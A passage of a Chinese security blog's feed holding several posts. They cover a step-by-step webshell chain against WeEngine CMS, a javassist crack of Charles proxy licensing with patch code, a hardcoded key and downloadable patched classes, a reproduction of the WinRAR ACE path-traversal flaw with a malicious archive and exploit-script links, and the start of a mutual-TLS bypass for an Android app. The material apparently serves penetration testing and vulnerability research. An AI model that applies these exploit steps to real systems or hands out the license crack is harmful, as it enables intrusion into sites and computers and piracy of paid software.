href="http://ip:port/web/index.php?c=cloud&amp;a=profile">http://ip:port/web/index.php?c=cloud&amp;a=profile</a> 时，就会判断站点ID和通信密钥是否为空（即站点是否注册），如果站点注册了，就会调用<code>cloud_site_info()</code>函数获取站点信息。函数<code>cloud_site_info()</code>调用了<code>cloud_api(&#39;site/info&#39;)</code>，这里的method为<code>site/info</code>，所以继续调用<code>cloud_build_transtoken</code>从会而将<code>cloud_transtoken</code>的内容写入数据库。然后通过数据库备份的功能，就可以看到数据库中保存的<code>cloud_transtoken</code>，进而可以利用之前的分析写shell。</p><h3 id="3-自定义数据库备份"><a href="#3-自定义数据库备份" class="headerlink" title="3.自定义数据库备份"></a>3.自定义数据库备份</h3><p>由于数据库备份需要关闭站点，为了不影响目标站点的使用，这里我们搭建一个环境演示一下过程（需要注册站点）。</p><p>登录成功后更新缓存，然后访问<a href="http://ip:port/web/index.php?c=cloud&amp;a=profile">http://ip:port/web/index.php?c=cloud&amp;a=profile</a> ，关闭站点后进行数据库备份。</p><p><img src="11.png" alt="11"></p><p>发现可以获取<code>cloud_transtoken</code>，但是数据库目录和文件的名字是随机的。</p><p><img src="12.png" alt="12"></p><p>而且如果备份文件里面的数据库文件不是最新的，那么即使获取到<code>cloud_transtoken</code>也无法利用，我们需要最新的备份文件。</p><p>然后我们看一下数据库备份是怎么实现的，打开<code>web/source/system/database.ctrl.php</code>。</p><p><img src="13.png" alt="13"></p><p>发现文件夹和分卷名可以自定义，如果为空或不满足条件的话，文件夹是时间戳、下划线和8位随机字符串的拼接，分卷名是<code>volume-10位随机字符串-1.sql</code>的形式，既然可以自定义，那么就简单多了。</p><p>访问链接<a href="http://ip:port/web/index.php?c=system&amp;a=database&amp;do=backup&amp;status=1&amp;start=2&amp;folder_suffix=123&amp;volume_suffix=456">http://ip:port/web/index.php?c=system&amp;a=database&amp;do=backup&amp;status=1&amp;start=2&amp;folder_suffix=123&amp;volume_suffix=456</a> 进行数据库备份，则数据库备份文件的地址为：<a href="http://ip:port/data/backup/123/volume-456-1.sql">http://ip:port/data/backup/123/volume-456-1.sql</a></p><p><img src="14.png" alt="14"></p><p>然后就可以随时获取<code>cloud_transtoken</code>了。接下来就可以进行shell的获取了。</p><h3 id="4-获取WEBSHELL"><a href="#4-获取WEBSHELL" class="headerlink" title="4.获取WEBSHELL"></a>4.获取WEBSHELL</h3><p>根据上面的分析，<code>cloud_transtoken</code>、<code>authkey</code>已经知道了，接下来就是构造payload了。</p><p><img src="15.png" alt="15"></p><p>然后请求<a href="http://ip:port/web/index.php?c=cloud&amp;a=dock&amp;do=download">http://ip:port/web/index.php?c=cloud&amp;a=dock&amp;do=download</a> ，data为生成的payload。</p><p><img src="16.png" alt="16"></p><p><img src="17.png" alt="17"></p><p>可以进行任意文件的写入，对目标系统进行测试，也成功获取了shell。</p><h3 id="5-延伸"><a href="#5-延伸" class="headerlink" title="5.延伸"></a>5.延伸</h3><p>上面是因为有系统文件备份，然后获取<code>/data/config.php</code>中的<code>authkey</code>。如果没有文件备份，登录了一个管理员权限的用户，能否获取shell呢。答案也是可以的。</p><p>该系统有一个木马查杀功能，可以根据这个功能读取文件内容。</p><p><img src="18.png" alt="18"></p><p>选择一个目录，然后提交并拦截数据库包，修改查杀目录为<code>data/.</code>，特征函数为<code>password</code>。然后就可以看到查杀结果，获取<code>authkey</code>的值。</p><p><img src="19.png" alt="19"></p><p>在对最新版 v2.5.7（202002140001）进行木马查杀的时候，可以从查杀报告中看到该文件，但是查看时提示文件不存在。原因是最新版利用正则对文件路径进行匹配，如果匹配成功就提示文件不存在（windows下可以利用大写路径绕过）。</p><p><img src="20.png" alt="20"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>根据上面对分析过程，该漏洞的利用过程如下：</p><p>1.成功登录后台，且拥有管理员权限。</p><p>2.更新缓存（非必须），访问链接<a href="http://ip:port/web/index.php?c=cloud&amp;a=profile">http://ip:port/web/index.php?c=cloud&amp;a=profile</a> 写入<code>cloud_transtoken</code>到数据库中。</p><p>3.关闭站点并进行使用自定义的目录进行数据库备份，链接地址：<a href="http://ip:port/web/index.php?c=system&amp;a=database&amp;do=backup&amp;status=1&amp;start=2&amp;folder_suffix=123&amp;volume_suffix=456">http://ip:port/web/index.php?c=system&amp;a=database&amp;do=backup&amp;status=1&amp;start=2&amp;folder_suffix=123&amp;volume_suffix=456</a> 。然后下载数据库备份，地址为：<a href="http://ip:port/data/backup/123/volume-456-1.sql">http://ip:port/data/backup/123/volume-456-1.sql</a> （多个分卷的话文件名为volume-456-2.sql、volume-456-3.sql… ）,然后找到<code>cloud_transtoken</code>。 </p><p>4.生成payload，请求<a href="http://ip:port/web/index.php?c=cloud&amp;a=dock&amp;do=download">http://ip:port/web/index.php?c=cloud&amp;a=dock&amp;do=download</a> ，写入shell。</p><p>总的来说，利用上述方法获取shell需要满足两个条件，第一是拥有一个管理员权限的用户，第二就是该站点注册了云服务。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;在一次授权测试中对某网站进行测试时，marry大佬发现了一个网站的备份文件，里面有网站源代码和数据库备份等。根据网站信息和代码都可以发现该系统采用的是微擎cms，利用数据库备份中的用户信息解密后可以登录系统，接下来要看是否可以获取webshell。&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="https://fuping.site/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="微擎" scheme="https://fuping.site/tags/%E5%BE%AE%E6%93%8E/"/>
    
      <category term="代码审计" scheme="https://fuping.site/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Charles的一次破解之旅</title>
    <link href="https://fuping.site/2019/10/25/charles-crack/"/>
    <id>https://fuping.site/2019/10/25/charles-crack/</id>
    <published>2019-10-24T16:00:00.000Z</published>
    <updated>2019-11-09T07:43:06.117Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>本文以WEB抓包工具Charles(v4.2.8)为例，讲解一下其注册的流程以及如何使用<strong>javassist</strong>对java软件进行修改，达到破解的目的。</p><a id="more"></a><p>先看一下实现的效果。使用<code>任意用户名+任意key</code>就可以进行激活。</p><p><img src="charles-crack%5C01.png" alt="注册"></p><p>激活成功</p><p><img src="charles-crack%5C02.png" alt="注册成功"></p><p>如果想换用户名，取消注册再次注册即可。</p><p>Help-&gt;Unregister Charles…</p><p><img src="charles-crack%5C03.png" alt=""></p><p>接下来我们来分析一下注册的流程，以及如何去破解。</p><h3 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h3><p>首先打开软件(版本为v4.2.8)，未注册时需要等待10s的动画才可进入，而且30分钟后会退出软件。</p><p>打开Help-&gt;Register Charles…，看到注册界面。</p><p><img src="charles-crack%5C04.png" alt=""></p><p>使用<code>jadx-gui</code>打开charles.jar，搜索字符串<code>Register Charles</code>，定位到<code>com.xk72.charles.gui.frames.RegisterFrame</code>中。</p><p><img src="charles-crack%5C05.png" alt=""></p><p><img src="charles-crack%5C06.png" alt=""></p><p>其中一段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.bRegister.addActionListener(<span class="keyword">new</span> NBdE(<span class="keyword">this</span>));</span><br></pre></td></tr></table></figure><p>可以看到注册按钮绑定的事件，当按下注册按钮时，执行<code>new NBdE(this)</code>。</p><p>跟进到<code>com.xk72.charles.gui.frames.NBdE</code></p><p><img src="charles-crack%5C07.png" alt=""></p><blockquote><p>其中的trim为Registered Name，trim2为License Key</p></blockquote><p>首先对输入的name和key进行判断，需要其长度要大于0，然后调用<code>qHTb.DdNM(trim, trim2)</code>方法，并对其返回的结果进行判断。当不为null时，注册失败。反之则注册成功。</p><p>跟进<code>com.xk72.charles.qHTb</code>中，调用的是<code>DdNM(String str1,String str2)</code></p><p><img src="charles-crack%5C08.png" alt=""></p><blockquote><p>由之前的推断可以知道，当<code>qHTb.DdNM(str1, str2)=null</code>时注册成功，这里DdNM(String str1,String str2)函数中如果正常执行<code>twLa = new qHTb(str, str2);</code>则会返回null，否则返回异常的信息。所以需要看<code>twLa = new qHTb(str, str2);</code>是否抛出异常，如果未异常，则返回为<code>null</code>，即注册成功；反之，注册失败。</p></blockquote><p>继续跟进构造函数<code>qHTb(String str1,String str2)</code>。</p><p><img src="charles-crack%5C09.png" alt=""></p><p>构造函数<code>qHTb(String str1,String str2)</code>调用了<code>qHTb(String str1,String str2,int i)</code></p><p>其主要代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">qHTb</span><span class="params">(String str, String str2, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">boolean</span> z = <span class="keyword">false</span>;</span><br><span class="line">     <span class="keyword">this</span>.gbef = <span class="keyword">false</span>;<span class="comment">//表示是否注册成功 true为成功</span></span><br><span class="line">     <span class="keyword">this</span>.lPpR = <span class="string">"Unregistered"</span>;<span class="comment">//注册成功后为输入的Registered Name</span></span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         String replaceAll = str.replaceAll(<span class="string">"[  ᠎    　]"</span>, <span class="string">" "</span>);<span class="comment">//替换特殊字符</span></span><br><span class="line">         <span class="keyword">if</span> (DdNM(twLa(replaceAll, str2, <span class="number">4</span>))) &#123;</span><br><span class="line">             z = <span class="keyword">true</span>;</span><br><span class="line">         &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!replaceAll.equals(str)) &#123;</span><br><span class="line">             z = DdNM(twLa(str, str2, <span class="number">4</span>));</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span> (!z) &#123;</span><br><span class="line">             <span class="keyword">throw</span> <span class="keyword">new</span> LicenseException(DdNM(<span class="number">2</span>));</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">this</span>.lPpR = str;<span class="comment">//注册成功，lPpR为Registered Name</span></span><br><span class="line">         <span class="keyword">this</span>.gbef = <span class="keyword">true</span>;<span class="comment">//注册成功</span></span><br><span class="line">     &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> LicenseException(DdNM(<span class="number">1</span>));</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>因此要使注册成功，首先需要<code>twLa(String str,String str2, int i)</code>在调用的时候无异常，并且需要<code>DdNM(long j)</code>返回为true。</p><p><img src="charles-crack%5C10.png" alt=""></p><p>由以上代码可知，当<code>j=lGuB</code>时，返回为true。<code>lGuB</code>为已知常量。即需要满足<code>j=5911726755176091652L;</code>时，<code>DdNM(long j)</code>返回为true。</p><p>接下来看<code>twLa(String str,String str2, int i)</code>。</p><p><img src="charles-crack%5C11.png" alt=""></p><blockquote><p>由于jadx-gui查看twLa未反编译完全，为了查看方便，这里用Idea打开。</p></blockquote><p><img src="charles-crack%5C12.png" alt=""></p><p>twLa方法的三个参数，var1是注册的name，var2是注册的key，var3是4.</p><p><img src="charles-crack%5C13.png" alt=""></p><p>分割线以上的为注册码的校验，下面为对用户名进行操作。可以从以上的代码看出，在用户名操作时没有抛出异常的行为，所以从这里来看，注册成功与否与用户名没有直接关系（因为从之前的推断可知，当出现异常时注册失败）。</p><p>所以这里的破解思路是：</p><p>使用<strong>javassist</strong>修改<code>twLa(String str,String str2, int i)</code>中的第二个参数，为一个可用的注册码，然后使该函数的返回值为<code>5911726755176091652L</code>即可。</p><p>当然也可以直接修改<code>DdNM(long j)</code>返回为true，修改DdNM<code>(String str1, String str2)</code>第二个参数为可用的key。这样修改以后，在软件运行注册的时候，可以达到任意用户名和任意key注册的效果。</p><blockquote><p>当然修改的方法不止这两种，知道注册流程后，修改就很容易了。</p></blockquote><p>接下来引入如何使用<strong>javassist</strong>来对软件进行修改。</p><h3 id="0x03-使用javassist进行修改"><a href="#0x03-使用javassist进行修改" class="headerlink" title="0x03 使用javassist进行修改"></a>0x03 使用javassist进行修改</h3><p>Javassist是一个开源的分析、编辑和创建Java字节码的类库。虽然关于java字节码的处理有很多工具，如bcel，asm。不过这些都需要直接跟虚拟机指令打交道。而且Javassit 提供了更高级的API，无需掌握字节码指令的知识，对使用者要求较低。直接使用java编码的形式，不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。</p><h4 id="v4-2-8的修改"><a href="#v4-2-8的修改" class="headerlink" title="v4.2.8的修改"></a>v4.2.8的修改</h4><p>根据上面的分析，修改v4.2.8时，需要修改<code>DdNM(long j)</code>返回为true，修改DdNM<code>(String str1, String str2)</code>第二个参数为可用的key，例如<code>C9D1226DB5B93C12D1</code>。</p><p>利用Javassist进行修改起来也很简单，具体实现代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">      pool.insertClassPath(<span class="string">"~/Desktop/charles.jar"</span>);</span><br><span class="line">      CtClass ctClass = pool.get(<span class="string">"com.xk72.charles.qHTb"</span>);</span><br><span class="line">      CtMethod ctm1 = ctClass.getDeclaredMethod(<span class="string">"DdNM"</span>,<span class="keyword">new</span> CtClass[]&#123;pool.get(<span class="string">"long"</span>)&#125;);</span><br><span class="line">      ctm1.setBody(<span class="string">"return true;"</span>);<span class="comment">//修改返回值</span></span><br><span class="line">      </span><br><span class="line">      CtMethod ctm2 = ctClass.getDeclaredMethod(<span class="string">"DdNM"</span>,<span class="keyword">new</span> CtClass[]&#123;pool.get(<span class="string">"java.lang.String"</span>),pool.get(<span class="string">"java.lang.String"</span>)&#125;);</span><br><span class="line">      ctm2.insertBefore(<span class="string">"$2=\"C9D1226DB5B93C12D1\";"</span>);<span class="comment">//修改第二个参数</span></span><br><span class="line"></span><br><span class="line">      ctClass.writeFile(<span class="string">"~/Desktop/"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>然后更新修改的内容，并替换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jar -uvf charles.jar com</span><br><span class="line"></span><br><span class="line">cp charles.jar /Applications/Charles.app/Contents/Java/</span><br></pre></td></tr></table></figure><p>然后再次打开Charles注册时就可以达到文章开头的效果了。</p><p>更改后的文件：<a href="https://fuping.site/files/qHTb.class">https://fuping.site/files/qHTb.class</a></p><blockquote><p>使用方法：新建文件夹com/xk72/charles，然后将class文件放入其中，执行<code>jar -uvf charles.jar com</code>。再替换charles.jar即可。</p></blockquote><h4 id="v4-5-4的修改"><a href="#v4-5-4的修改" class="headerlink" title="v4.5.4的修改"></a>v4.5.4的修改</h4><p>当时修改的时候最新版是v4.2.8，10.29号下载的是v4.5.1，还没来得及安装，再次查看最新版已经是v4.5.4了。</p><p>虽然更新了，其中类名和方法名改变了，但是注册的流程还是老样子。根据上面的思路可以进行修改。找到注册校验的类。</p><p><img src="charles-crack%5C14.png" alt=""></p><p>需要修改的类为<code>com.xk72.charles.DIWy</code>。</p><p>需要修改的方法：</p><p>1.<code>private boolean OZtq(long var1)</code>，返回值修改为true。</p><p>2.<code>public static String OZtq(String var0, String var1)</code>，第二个参数为可用的key。</p><p>修改的代码就不贴了，和上面的一样，修改一下类名和方法名即可。</p><p>打开Charles后任意用户名+任意注册码注册成功。</p><p><img src="charles-crack%5C15.png" alt=""></p><p>更改后的文件：<a href="https://fuping.site/files/DIWy.class">https://fuping.site/files/DIWy.class</a></p><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>关于Charles破解的文章，网上有很多。大多数都是直接修改了注册的标志和注册的信息，本文也是提供了另外一种破解的思路。通过简单分析注册的流程，然后使用javassist进行java文件的修改，以此达到破解的目的。</p><p>关于更多Charles破解相关的文章，可以参考以下几篇：</p><p>[1].<a href="http://scz.617.cn:8/misc/201910241714.txt" target="_blank" rel="noopener">http://scz.617.cn:8/misc/201910241714.txt</a> （有详细注册码的算法以及注册机）</p><p>[2].<a href="http://www.520monkey.com/archives/1295" target="_blank" rel="noopener">http://www.520monkey.com/archives/1295</a> （有分析和修改）</p><p>[3].<a href="https://www.freebuf.com/sectool/205520.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/205520.html</a> （有详细的javassist使用）</p><p>…</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;p&gt;本文以WEB抓包工具Charles(v4.2.8)为例，讲解一下其注册的流程以及如何使用&lt;strong&gt;javassist&lt;/strong&gt;对java软件进行修改，达到破解的目的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="软件破解" scheme="https://fuping.site/categories/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="Charles破解" scheme="https://fuping.site/tags/Charles%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="软件破解" scheme="https://fuping.site/tags/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="javassist" scheme="https://fuping.site/tags/javassist/"/>
    
  </entry>
  
  <entry>
    <title>WinRAR漏洞复现过程</title>
    <link href="https://fuping.site/2019/02/21/WinRAR-Extracting-Code-Execution-Validate/"/>
    <id>https://fuping.site/2019/02/21/WinRAR-Extracting-Code-Execution-Validate/</id>
    <published>2019-02-21T09:43:56.000Z</published>
    <updated>2019-02-22T01:51:19.473Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>近日Check Point团队爆出了一个关于WinRAR存在19年的漏洞，用它来可以获得受害者计算机的控制。攻击者只需利用此漏洞构造恶意的压缩文件，当受害者使用WinRAR解压该恶意文件时便会触发漏洞。</p><a id="more"></a><p>该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库<code>UNACEV2.dll</code>所造成的，该动态链接库在 2006 年被编译，没有任何的基础保护机制(ASLR, DEP 等)。动态链接库的作用是处理 ACE 格式文件。而WinRAR解压ACE文件时，由于没有对文件名进行充分过滤，导致其可实现目录穿越，将恶意文件写入任意目录,甚至可以写入文件至开机启动项，导致代码执行。</p><h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><p>影响软件：</p><p>WinRAR     &lt; 5.70 Beta 1</p><p>Bandizip    &lt; = 6.2.0.0</p><p>好压(2345压缩)    &lt; = 5.9.8.10907</p><p>360压缩    &lt; = 4.0.0.1170</p><p>等等…</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>该漏洞的实现过程：首先新建一个任意文件，然后利用WinACE进行压缩，修改filename来实现目录穿越漏洞，可以将文件解压到任意目录中。</p><p>主要所需工具<a href="https://web.archive.org/web/20170714193504/http:/winace.com:80/" target="_blank" rel="noopener"><code>WinACE</code></a>、010Editor。</p><p>下载WinACE并安装，安装完成后新建一个文本文件，名字任意。</p><p><img src="01.png" alt=""></p><p>然后利用WinACE进行压缩。</p><p><img src="02.png" alt=""></p><p>然后我们下载<a href="https://github.com/droe/acefile/blob/master/acefile.py" target="_blank" rel="noopener">acefile.py</a>脚本。</p><p>使用命令<code>python acefile.py --headers liehu.ace</code>来读取该文件头信息。</p><p><img src="03.png" alt=""></p><p>根据漏洞的描述，问题是出现在filename中的。那主要就看下面的header吧。</p><p>用010Editor打开该文件。</p><p><img src="04.png" alt=""></p><p>需要看选中的部分。对比acefile解析的结果，并明白各个段对应的内容。</p><p><img src="05.png" alt=""></p><p>如果要修改filename，则需要修改上面标注这几处。第一处为0x4e9a(hdr_crc),第二处为0x0044(hdr_size)，第三处为0x0025(filename的长度），以及最后一处为filename。</p><p>修改顺序是由后到前。</p><p>这里修改filename为<code>d:\d:\liehu.txt</code></p><p>长度为15，对应的hex为0x000f</p><p><img src="06.png" alt=""></p><p>然后修改hdr_size，长度为46，对应的hex为0x002E。</p><p><img src="07.png" alt=""></p><p>接下来就是修改hdr_crc了，这里有一个取巧的方法。</p><p>我们再次运行命令<code>python acefile.py --headers liehu.ace</code></p><p>程序中断并提示<code>CorruptedArchiveError: header CRC failed</code></p><p>定位到错误的位置</p><p><img src="08.png" alt=""></p><p>这里<code>ace_crc16(buf)</code>的值就是ace文件0x4e9a对应的值，直接打印出该值并将该位置的值修改即可。</p><p><img src="09.png" alt=""></p><p>对应的值为63232，转换为hex为0xF700。</p><p><img src="10.png" alt=""></p><p>最后文件内容为</p><p><img src="11.png" alt=""></p><p>再次查看，可以正常解析，并看到filename已经修改成功</p><p><img src="12.png" alt=""></p><p>右键解压该文件，则会在D盘生成一个liehu.txt文件。</p><p><img src="13.png" alt=""></p><p>测试文件：</p><p><a href="https://fuping.site/files/liehu.ace">https://fuping.site/files/liehu.ace</a></p><blockquote><p>解压后会在D盘生成一个liehu.txt文件</p></blockquote><p>测试脚本：</p><p><a href="https://github.com/fupinglee/MyPython/blob/master/exploit/WinRAR_exploit/WinRAR_exploit.py" target="_blank" rel="noopener">https://github.com/fupinglee/MyPython/blob/master/exploit/WinRAR_exploit/WinRAR_exploit.py</a></p><h2 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h2><p>有两种方式</p><ol><li><p>升级到最新版本，WinRAR 目前版本是 5.70 Beta 1</p></li><li><p>删除UNACEV2.dll文件</p></li></ol><p><img src="14.png" alt=""></p><p>此时再次解压恶意文件会提示如下错误：</p><p><img src="15.png" alt=""></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">https://research.checkpoint.com/extracting-code-execution-from-winrar/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h2&gt;&lt;p&gt;近日Check Point团队爆出了一个关于WinRAR存在19年的漏洞，用它来可以获得受害者计算机的控制。攻击者只需利用此漏洞构造恶意的压缩文件，当受害者使用WinRAR解压该恶意文件时便会触发漏洞。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Exploit" scheme="https://fuping.site/categories/Exploit/"/>
    
    
      <category term="WinRAR漏洞" scheme="https://fuping.site/tags/WinRAR%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>安卓APP测试之双向证书认证</title>
    <link href="https://fuping.site/2019/02/13/SoulAPP-SSL-Bypass/"/>
    <id>https://fuping.site/2019/02/13/SoulAPP-SSL-Bypass/</id>
    <published>2019-02-13T02:21:36.000Z</published>
    <updated>2019-02-20T16:31:43.442Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>在《<a href="https://fuping.site/2019/01/25/Frida-Hook-SoulAPP/">安卓APP测试之HOOK大法-Frida篇</a>》文章中有一个双向证书认证没详细说明，经过<strong>孔已己</strong>的提示，现在补充一下。</p><a id="more"></a><h2 id="0x02-双向证书认证与解决方法"><a href="#0x02-双向证书认证与解决方法" class="headerlink" title="0x02 双向证书认证与解决方法"></a>0x02 双向证书认证与解决方法</h2><p>在对soulApp进行抓包的时候，提示<strong><code>网络错误,请检查网络后重试~</code></strong></p><p><img src="01.png" alt=""></p><p>本来以为直接把这个okhttp的证书hook修改成系统默认的即可，就没有详细说明这一部分，结果有网友问双向证书认证这部分是如何处理的，就详细来说明一下如何处理。这里时由于采用了双向证书认证的缘故，所以抓包返回400错误，直接浏览器访问<a href="https://account.soulapp.cn/" target="_blank" rel="noopener">https://account.soulapp.cn/</a> ，也是不行的</p><p><img src="02.png" alt=""></p><p>提示<code>No required SSL certificate was sent.</code>如果要访问成功，就要带上证书。</p><blockquote><p>关于双向证书认证：客户端有自己的密匙，并持有服务端的证书，服务端给客户端发送数据时，需要将服务端的证书发给客户端验证，验证通过才运行发送数据，同样，客户端请求服务器数据时，也需要将自己的证书发给服务端验证，通过才允许执行请求。详细的内容可以参考<a href="https://blog.csdn.net/enweitech/article/details/53813183。" target="_blank" rel="noopener">https://blog.csdn.net/enweitech/article/details/53813183。</a></p></blockquote><p>我们本地来测试一下，简单介绍一下如何搭建双向证书认证环境。</p><h3 id="1-双向证书认证服务器的搭建"><a href="#1-双向证书认证服务器的搭建" class="headerlink" title="1.双向证书认证服务器的搭建"></a>1.双向证书认证服务器的搭建</h3><p><strong>创建一个证书的步骤：</strong> </p><p><strong>（1）生成系统私钥</strong></p><p><strong>（2）生成待签名证书</strong></p><p><strong>（3）生成x509证书, 用CA私钥进行签名</strong></p><blockquote><p>证书的生成过程略。</p></blockquote><p>以tomcat服务器为例。将生成的服务端证书<code>server.p12</code>和客户端信任证书<code>truststore.jks</code>放入conf目录下。修改tomcat下conf/server.xml文件，去掉https的注释。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port&#x3D;&quot;8443&quot; protocol&#x3D;&quot;org.apache.coyote.http11.Http11Protocol&quot;</span><br><span class="line">               maxThreads&#x3D;&quot;150&quot; SSLEnabled&#x3D;&quot;true&quot; scheme&#x3D;&quot;https&quot; secure&#x3D;&quot;true&quot;</span><br><span class="line">               clientAuth&#x3D;&quot;false&quot; sslProtocol&#x3D;&quot;TLS&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port&#x3D;&quot;8443&quot; protocol&#x3D;&quot;org.apache.coyote.http11.Http11Protocol&quot;</span><br><span class="line">truststoreFile&#x3D;&quot;conf&#x2F;truststore.jks&quot; truststorePass&#x3D;&quot;123456&quot; truststoreType&#x3D;&quot;JKS&quot;</span><br><span class="line">    keystoreFile&#x3D;&quot;conf&#x2F;server.p12&quot; keystorePass&#x3D;&quot;123456&quot; keystoreType&#x3D;&quot;PKCS12&quot; </span><br><span class="line">    maxThreads&#x3D;&quot;150&quot; SSLEnabled&#x3D;&quot;true&quot; scheme&#x3D;&quot;https&quot; secure&#x3D;&quot;true&quot;</span><br><span class="line">    clientAuth&#x3D;&quot;false&quot; sslProtocol&#x3D;&quot;TLS&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>此时<code>clientAuth=&quot;false&quot;</code>，未开启客户端校验。</p></blockquote><p>启动服务器并访问。</p><p><img src="03.png" alt=""></p><p>虽然提示错误但是点继续前往即可访问。</p><p><img src="04.png" alt=""></p><p>设置开启客户端校验，即<code>clientAuth=&quot;true&quot;</code></p><p>然后重启后访问</p><p><img src="05.png" alt=""></p><p>无法正常访问，想要正常访问，浏览器导入证书即可</p><p><img src="06.png" alt=""></p><p>下一步然后输入密码</p><p><img src="07.png" alt=""></p><p>刷新页面，提示选择证书。</p><p><img src="08.png" alt=""></p><p>确定后即可访问。</p><h3 id="2-soulAPP双向认证解决方法"><a href="#2-soulAPP双向认证解决方法" class="headerlink" title="2.soulAPP双向认证解决方法"></a>2.soulAPP双向认证解决方法</h3><p>同理这里soulApp也可以这样做。</p><p>这里列举三种方法来完成客户端的验证。归根结底都是证书的利用。</p><h4 id="a-浏览器导入证书"><a href="#a-浏览器导入证书" class="headerlink" title="a)浏览器导入证书"></a>a)浏览器导入证书</h4><p>利用soulApp中的证书和密码生成浏览器证书。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 